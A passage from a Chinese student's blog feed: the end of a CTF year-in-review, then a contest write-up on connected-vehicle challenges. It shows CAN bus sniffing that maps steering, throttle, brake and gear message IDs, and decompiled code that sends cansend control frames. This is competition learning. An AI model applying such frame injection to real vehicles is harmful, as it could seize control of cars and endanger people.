title="10月"></a>10月</h1><p>这个月基本就是每周周末都打一个比赛，GeekGame好玩</p><p>然后就没干啥了，每天赶赶各种课的实验报告和作业，花时间准备一下期中考，没学什么新东西</p><hr><h1 id="11月"><a href="#11月" class="headerlink" title="11月"></a>11月</h1><p>最疯狂的一个月，强网杯初赛所有人拼尽全力最终拿下，算是创造了NISA一个难以逾越的高峰</p><p>然后每周都出差，出差打网鼎杯，出差打工业互联网，周三周四的课主打一个全翘了（</p><p>网鼎杯半决赛渗透应出未出的弱密码，我不会放过你的👁，某种意义上这导致了后面队友的退役，唉唉</p><hr><h1 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h1><p>强网杯决赛，性质上感觉属于表演赛，但是永久会场场馆的规模是真nb啊，主办方报销真nb啊</p><p>难以置信，怎么回来就要准备面对一堆大作业的ddl和期末考了，很完蛋呢，不过不会再有哪科会挂了（会赢的.jpg</p><p>中间打了一下 CCB&amp;CISCN，哎卧槽ccb怎么这么坏😭，一觉醒来NISA实力下降一万倍，果然两位核心的退役还是给NISA带来了重创</p><p>DAS经典web爆零，什么时候我才能在 dasctf 上做出一点高质量题目啊😫</p><hr><h1 id="present"><a href="#present" class="headerlink" title="present"></a>present</h1><p>依旧是某默默无闻的十八线web🐕</p><p>又是被大佬们的年度总结所震撼的一年，羡慕大b哥大三就能有班上，年底还有好几家offer（</p><p>看看我这一年干了什么呢，看着这么多的比赛经历挺风光的，实则都是托了队友的福，头起太高也不是什么好事，这样后面的落差会相当大（</p><p>自主coding能力依旧稀烂，写个脚本都得跟GPT交流半天，这以后还怎么写工具做武器化啊(╯‵□′)╯︵┻━┻</p><p>也是察觉到了自己的一个问题，做题速度太慢，只有在凌晨的时候效率大幅提升，简单题都得花不少时间，不知道是不是学得过拟合了（</p><p>貌似陷入了打比赛爆零——花大把时间复现题目——没时间学新东西——打比赛爆零的循环，总之现在要复现的东西已经堆成山了，哈哈😄</p><p>但是没啥关系，每次打比赛都能逼着自己去学一些新的东西，去享受坐牢的过程，主打一个给自己上强度，hh</p><hr><h1 id="future"><a href="#future" class="headerlink" title="future"></a>future</h1><p>喜报：下学期开始没有要重修的科目了！（乐</p><p>关于实习，很淦的一点是我们实习的方式是投票选择的，最终的投票结果是学校安排集中实习，emmm，这tm是不是要去打黑工了，更淦的是这个实习还设置在了大四上，嗯没错，我们亲爱的计组设置在了大三下来上，然后看了下大三下的课表。。。周六排课也是神人了；依旧是一大堆没啥用的实训 ≈ 一大堆课早八午二 ≈ 一大堆大作业，我nm上个大学怎么这么多事.jpg</p><p>渗透，关于域只能说是一点不会，春秋云境看来得提上日程了，不然打国赛都费劲</p><p>后辈的培养，老实说，我不是很能理解这个b学分绩点为什么那么吸引人，这两届招过来的绝大多数人功利性都十分明显，奔着比赛加学分保研来的，整天想让别人带带，自己学的东西是一点进展没有，各个比赛也没啥积极性，只有会加学分的才报一下，真完蛋woc</p><p>然后呢，新的一年估计我还会是那个臭赛棍（</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;结束了各科期末考，放寒假了终于有时间能写写年终总结了&lt;/p&gt;
&lt;p&gt;过去的一年经历了很多事情，转眼间大三一学期就过去了，很多事情都发生了改变&lt;/p&gt;
&lt;p&gt;托NISA各位的福，去了很多地方打了许多比赛，让机场成为我这个废宅最熟悉的地方（&lt;/p&gt;</summary>
    
    
    
    <category term="Thinking" scheme="http://c1oudfl0w0.github.io/blog/categories/Thinking/"/>
    
    
  </entry>
  
  <entry>
    <title>第八届工业信息安全技能大赛复赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/</id>
    <published>2025-01-09T01:09:17.000Z</published>
    <updated>2025-02-04T14:18:38.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知道啊，听说在海南打就去了（</p><span id="more"></span><hr><h1 id="港口工业挑战区"><a href="#港口工业挑战区" class="headerlink" title="港口工业挑战区"></a>港口工业挑战区</h1><p>看不懂，连环境在哪都没找到</p><p>据说是扫b段，但是我扫出来的几个都没法访问，不会要拿工控软件连吧</p><hr><h1 id="车路云安全挑战区"><a href="#车路云安全挑战区" class="headerlink" title="车路云安全挑战区"></a>车路云安全挑战区</h1><p>车联网意外的很能打，最后在一堆企业里杀到单项第五</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110120340616.png" alt="image-20250110120340616"></p><h2 id="底盘域"><a href="#底盘域" class="headerlink" title="底盘域"></a>底盘域</h2><h3 id="底盘域状态报文ID获取"><a href="#底盘域状态报文ID获取" class="headerlink" title="底盘域状态报文ID获取"></a>底盘域状态报文ID获取</h3><p>使用 cansniffer 抓包，注意控制车辆的web端的 ws 流要保持连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cansniffer <span class="token parameter variable">-c</span> can0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先测方向盘，缓缓调整方向盘角度</p><p>同时观察抓包情况</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">25</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  31F  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">5.384565</span>  <span class="token number">401</span>  00 01 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">30</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.038971</span>  <span class="token number">401</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">38</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">0.413291</span>  <span class="token number">401</span>  FF F7 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">43</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">9.999999</span>  2F7  9A <span class="token number">99</span> <span class="token number">59</span> 3F 00 00 00 00 <span class="token punctuation">..</span>Y?<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">401</span>  FF F7 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">62</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F7  9A <span class="token number">99</span> <span class="token number">59</span> 3F 00 00 00 00 <span class="token punctuation">..</span>Y?<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.590077</span>  <span class="token number">401</span>  FF F0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">77</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  <span class="token number">401</span>  FF F0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">81</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">9.999999</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">401</span>  FF F0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">82</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">99</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.328627</span>  <span class="token number">401</span>  FF E3 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么可以猜测和方向盘有关的报文ID为401</p><p>同理测油门：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">33</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  <span class="token number">105</span>  00 <span class="token number">40</span> 00 00 00 00 00 00 .@<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.072732</span>  <span class="token number">204</span>  <span class="token number">22</span> 00 00 00 00 00 00 00 <span class="token string">".......0.000000  2F6  0A 00 00 00 00 00 00 00 ........0.000000  30F  03 E6 00 00 00 00 00 00 ........0.000000  314  00 40 00 00 00 00 00 00 .@......7.018217  315  00 10 00 00 00 00 00 00 ........7.020064  32F  00 01 00 00 00 00 00 00 ........0.050987  402  22 00 00 00 00 00 00 00 "</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">49</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.008977</span>  <span class="token number">105</span>  01 <span class="token number">28</span> 00 00 00 00 00 00 .<span class="token punctuation">(</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.187966</span>  <span class="token number">204</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">2.005456</span>  30F  03 E4 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.003900</span>  <span class="token number">314</span>  01 <span class="token number">28</span> 00 00 00 00 00 00 .<span class="token punctuation">(</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.999780</span>  <span class="token number">315</span>  00 2B 00 00 00 00 00 00 .+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.004486</span>  31F  00 05 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.998573</span>  32F  00 08 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.059475</span>  <span class="token number">402</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>报文ID为402</p><p>刹车：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">29</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">1.003801</span>  <span class="token number">105</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.245428</span>  <span class="token number">205</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">1.007777</span>  30F  03 B0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.003799</span>  <span class="token number">314</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">7.006076</span>  <span class="token number">315</span>  01 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.007778</span>  31F  00 6D 00 00 00 00 00 00 .m<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.003865</span>  32F  00 A4 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.067160</span>  <span class="token number">403</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">31</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  <span class="token number">105</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">205</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">0.000000</span>  30F  03 B0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">314</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">315</span>  01 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  31F  00 6D 00 00 00 00 00 00 .m<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  32F  00 A4 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">403</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>报文ID为403</p><p>档位：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">21</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  <span class="token number">105</span>  00 B3 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  2F3  B8 0B 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.000811</span>  30F  03 <span class="token number">72</span> 00 00 00 00 00 00 .r<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">314</span>  00 B3 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">315</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.001970</span>  31F  00 E9 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.001312</span>  32F  01 5E 00 00 00 00 00 00 .^<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">404</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">24</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F3  B8 0B 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">9.999999</span>  2F7  9A <span class="token number">99</span> <span class="token number">59</span> 3F 00 00 00 00 <span class="token punctuation">..</span>Y?<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  30F  03 <span class="token number">72</span> 00 00 00 00 00 00 .r<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">315</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  31F  00 E9 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  32F  01 5E 00 00 00 00 00 00 .^<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">404</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>报文ID为404</p><p>flag：<code>dk_flag&#123;401_402_403_404&#125;</code></p><hr><h2 id="自动驾驶域"><a href="#自动驾驶域" class="headerlink" title="自动驾驶域"></a>自动驾驶域</h2><h3 id="自动驾驶逻辑破解"><a href="#自动驾驶逻辑破解" class="headerlink" title="自动驾驶逻辑破解"></a>自动驾驶逻辑破解</h3><p>逆向出来的核心逻辑：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 404#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v4 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 挂1档</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 402#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v5 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 踩油门到40度</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 404#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 挂2档</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 402#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v7 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 踩油门到50度</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 401#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v8 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 左转30度</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 402#00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 松开油门</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 403#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v9 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v9<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 踩刹车到70度</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">receive_can_message</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token number">789</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 404#00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 挂N档</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 403#00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 松开刹车</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自动驾驶逻辑：先挂1档起步，踩油门到40度，车速 27km&#x2F;h 左右；然后挂2档，车速 35km&#x2F;h 左右，踩油门到50度，车速 14km&#x2F;h 左右；接下来方向盘左转30度，车速 9km&#x2F;h 左右，松开油门；踩刹车到70度，挂N档，然后松开刹车，停车</p><hr><h2 id="车身域"><a href="#车身域" class="headerlink" title="车身域"></a>车身域</h2><h3 id="车窗报文获取"><a href="#车窗报文获取" class="headerlink" 